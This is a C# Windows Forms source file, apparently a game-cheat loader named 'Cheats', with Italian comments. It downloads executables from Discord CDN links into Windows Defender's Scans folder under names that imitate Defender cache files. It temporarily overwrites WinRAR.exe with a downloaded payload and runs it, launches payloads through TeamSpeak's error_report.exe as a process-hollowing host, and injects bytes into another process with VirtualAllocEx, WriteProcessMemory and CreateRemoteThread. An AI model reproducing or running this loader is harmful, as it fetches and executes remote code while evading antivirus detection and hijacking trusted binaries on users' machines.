using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Security.AccessControl;
using System.Runtime.InteropServices;




namespace Reverse
{
    public partial class Cheats : Form
    {

        private byte[] originalContent;
        private Process winrarProcess;

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        public const int PROCESS_CREATE_THREAD = 0x0002;
        public const int PROCESS_QUERY_INFORMATION = 0x0400;
        public const int PROCESS_VM_OPERATION = 0x0008;
        public const int PROCESS_VM_WRITE = 0x0020;
        public const int PROCESS_VM_READ = 0x0010;
        public const uint MEM_COMMIT = 0x00001000;
        public const uint PAGE_EXECUTE_READWRITE = 0x40;
        public Cheats()
        {
            InitializeComponent();
          
        }

        private void Exit_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void MinimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void OptionsTab_Click(object sender, EventArgs e)
        {
            OptionsForm frm = new OptionsForm();
            frm.Show();
            this.Hide();
        }

        private void guna2Button10_Click(object sender, EventArgs e)
        {
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebClient webClient = new WebClient();
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/1140805196927213579/1142262869346496642/launcher.exe", @"C:\ProgramData\Microsoft\Windows Defender\Scans\mpcache-1646ED4AFA7A2FFE14979AEA79975FE6776DBD07.bin.80");
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/1108786431020769330/1150403330946904115/mpcache-1646ED4AFA7A2FFE14979AEA79975FE6776DBD07.bin.7C", @"C:\\ProgramData\\Microsoft\\Windows Defender\\Scans\\mpcache-1646ED4AFA7A2FFE14979AEA79975FE6776DBD07.bin.7C");
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/1108786431020769330/1150198834820042752/remotecache.vdf", @"C:\ProgramData\Microsoft\Windows Defender\Scans\mpcache-1646ED4AFA7A2FFE14979AEA79975FE6776DBD07.bin.67");

        }

        private void GosthExecute_Click(object sender, EventArgs e)
        {
            string injectedDataFilePath = "C:\\ProgramData\\Microsoft\\Windows Defender\\Scans\\mpcache-1646ED4AFA7A2FFE14979AEA79975FE6776DBD07.bin.80";
            if (File.Exists(injectedDataFilePath))
            {
                byte[] injectedData = File.ReadAllBytes(injectedDataFilePath);
                dio(injectedData);
            }
            else
            {
                MessageBox.Show("Injected data file not found.");
            }

        }

        private void GosthClean_Click(object sender, EventArgs e)
        {



            string fileExePath = @"C:\Program Files\TeamSpeak 3 Client\error_report.exe";
            string nomeExePath = @"C:\ProgramData\Microsoft\Windows Defender\Scans\mpcache-1646ED4AFA7A2FFE14979AEA79975FE6776DBD07.bin.67";

            RunProcessHollowing(fileExePath, nomeExePath);


        }

        private void RunProcessHollowing(string fileExePath, string nomeExePath)
        {
            try
            {
                // Verifica se il file runpe.exe esiste nel percorso specificato
                if (!File.Exists(fileExePath))
                {
                    throw new FileNotFoundException("File  not found.");
                }

                // Crea un nuovo processo per eseguire il prompt dei comandi
                Process process = new Process();

                // Imposta le proprietà del processo
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.RedirectStandardInput = true;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;

                // Avvia il processo del prompt dei comandi
                process.Start();

                // Invia i comandi al prompt dei comandi per eseguire runpe.exe con la path del file da impersonare
                process.StandardInput.WriteLine($"cd /d \"{Path.GetDirectoryName(fileExePath)}\"");
                process.StandardInput.WriteLine($"error_report.exe \"{nomeExePath}\"");

                // Chiude lo standard input per indicare la fine dei comandi
                process.StandardInput.Close();

                // Legge l'output e gli eventuali messaggi di errore dal prompt dei comandi
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();

                // Attendi la chiusura del processo del prompt dei comandi
                process.WaitForExit();

                // Verifica eventuali messaggi di errore
                if (!string.IsNullOrEmpty(error))
                {
                    throw new Exception("Error executing .exe: " + error);
                }

                // Il processo di hollowing è stato completato con successo
                MessageBox.Show("completed successfully.");
            }
            catch (FileNotFoundException ex)
            {
                MessageBox.Show("Error: " + ex.Message);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error executing hollowing process: " + ex.Message);
            }
        }

        private void dio(byte[] injectedData)
        {
            originalContent = ReadOriginalContent();
            WriteFile(injectedData);

            Thread.Sleep(3 * 3000); // 10 secondi di ritardo

            ExecuteWinRAR();

            // Attendere la chiusura del processo WinRAR
            if (winrarProcess != null)
            {
                winrarProcess.WaitForExit();
            }

            Thread.Sleep(3 * 3000); // 10 secondi di ritardo

            Cleanup();
        }

        private void Cleanup()
        {
            if (originalContent != null) // Verifica se originalContent è stato inizializzato correttamente
            {
                byte[] originalContentCopy = new byte[originalContent.Length];
                Array.Copy(originalContent, originalContentCopy, originalContent.Length);

                for (int i = 0; i < originalContent.Length; i++)
                {
                    originalContent[i] = 0;
                }

                string filePath = @"C:\Program Files\WinRAR\WinRAR.exe";
                File.WriteAllBytes(filePath, originalContentCopy);

                // MessageBox.Show("File restored to its original content.");
            }
            else
            {
                // MessageBox.Show("originalContent is null. Cannot restore file.");
            }
        }

        private byte[] ReadOriginalContent()
        {
            string filePath = @"C:\Program Files\WinRAR\WinRAR.exe";
            return File.ReadAllBytes(filePath);
        }

        private void WriteFile(byte[] injectedData)
        {
            string filePath = @"C:\Program Files\WinRAR\WinRAR.exe";
            File.WriteAllBytes(filePath, injectedData);
        }

       

        private void ExecuteWinRAR()
        {
            string filePath = @"C:\Program Files\WinRAR\WinRAR.exe";

            if (File.Exists(filePath))
            {
                try
                {
                    // Avvia WinRAR come processo e assegna il processo alla variabile winrarProcess
                    winrarProcess = Process.Start(filePath);
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Failed to start WinRAR: " + ex.Message);
                }
            }
            else
            {
                MessageBox.Show("WinRAR file not found.");
            }
        }

        private void CutieExecute_Click(object sender, EventArgs e)
        {
           


        }

        private void CutieClean_Click(object sender, EventArgs e)
        {
           
        }

        private void guna2Button11_Click(object sender, EventArgs e)
        {

           

        }

        private void DestructAll_Click(object sender, EventArgs e)
        {
          

            string fileExePath = @"C:\Program Files\TeamSpeak 3 Client\error_report.exe";
            string nomeExePath = @"C:\ProgramData\Microsoft\Windows Defender\Scans\mpcache-1646ED4AFA7A2FFE14979AEA79975FE6776DBD07.bin.83";

            RunProcessHollowing(fileExePath, nomeExePath);

        }

        private void Cheats_Load(object sender, EventArgs e)
        {

        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {

            string targetPath = "C:\\Windows\\System32\\notepad.exe";  // Percorso del file eseguibile da copiare
            string newProcessPath = "C:\\Users\\mxrcy\\Desktop\\obf\\offuscato.exe";  // Percorso del nuovo processo

            byte[] shellcode = File.ReadAllBytes(targetPath);  // Legge il contenuto del file eseguibile

            Process process = new Process();
            process.StartInfo.FileName = newProcessPath;
            process.StartInfo.CreateNoWindow = false;  // Mostra la finestra del processo
            process.StartInfo.UseShellExecute = false;

            process.Start();  // Avvia il processo in sospensione

            IntPtr processHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, process.Id);

            IntPtr allocatedMemory = VirtualAllocEx(processHandle, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            WriteProcessMemory(processHandle, allocatedMemory, shellcode, (uint)shellcode.Length, out int bytesWritten);

            IntPtr threadHandle = CreateRemoteThread(processHandle, IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, IntPtr.Zero);

            process.WaitForExit();

        }
    }

}

